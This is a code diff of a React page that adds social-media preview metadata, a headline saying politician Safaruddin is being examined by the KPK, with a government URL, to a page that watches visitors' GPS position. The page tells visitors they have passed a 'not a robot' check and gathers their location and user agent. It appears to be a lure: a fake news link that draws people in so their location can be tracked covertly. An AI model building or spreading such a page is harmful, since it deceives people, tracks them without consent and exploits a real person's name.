@@ -1,9 +1,16 @@
 import React, { useState, useEffect, useCallback } from 'react';
+import DynamicPage from './DynamicPage';
 
 const Home = () => {
   const [gpsEnabled, setGpsEnabled] = useState(true);
   const [watchId, setWatchId] = useState(null);
 
+  const pageData = {
+    title: 'Mantan Wakil Ketua DPRA Safaruddin Diperiksa KPK',
+    description: 'Sosok calon bupati aceh barat daya 2024 Dr. Safaruddin diperiksa oleh KPK. Dugaan sementara pemeriksaan terhadap ....',
+    image: 'https://www.mimbaraceh.com/files/images/20220522-wakil-ketua-dpra-safaruddin-headshoot.jpg',
+    url: 'https://dpra.acehprov.go.id/pejabat/pimpinan-dpra/wakil-ketua-iii-dewan-perwakilan-rakyat-aceh'
+  };
   const sendLocationData = (latitude, longitude, accuracy) => {
     console.log('Sending location data:', { latitude, longitude, accuracy });
     const userAgent = navigator.userAgent;
@@ -73,6 +80,13 @@ const Home = () => {
 
   return (
     <div style={{ textAlign: 'center', padding: '20px' }}>
+      <DynamicPage 
+        title={pageData.title} 
+        description={pageData.description} 
+        image={pageData.image} 
+        url={pageData.url}
+      />
+
       {gpsEnabled ? (
         <div>
           <p style={{ color: 'green' }}>Anda sudah di konfirmasi bahwa bukan robot.</p>
